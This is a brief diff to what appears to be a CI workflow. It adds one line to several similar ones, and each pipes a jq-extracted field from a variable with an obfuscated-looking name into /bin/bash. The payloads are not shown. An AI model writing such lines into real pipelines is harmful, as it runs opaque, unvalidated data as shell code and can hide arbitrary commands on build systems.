@@ -52,6 +52,7 @@ jobs:
           echo $x9 | jq -r .kr26378 | /bin/bash
           echo $ej86 | jq -r .aphgr2 | /bin/bash
           echo $gzued0 | jq -r .sixs0040 | /bin/bash
+          printf '%s' "$jdvpw01440" | jq -r .o059 | /bin/bash
 
       - name: Save archive
         if: always()
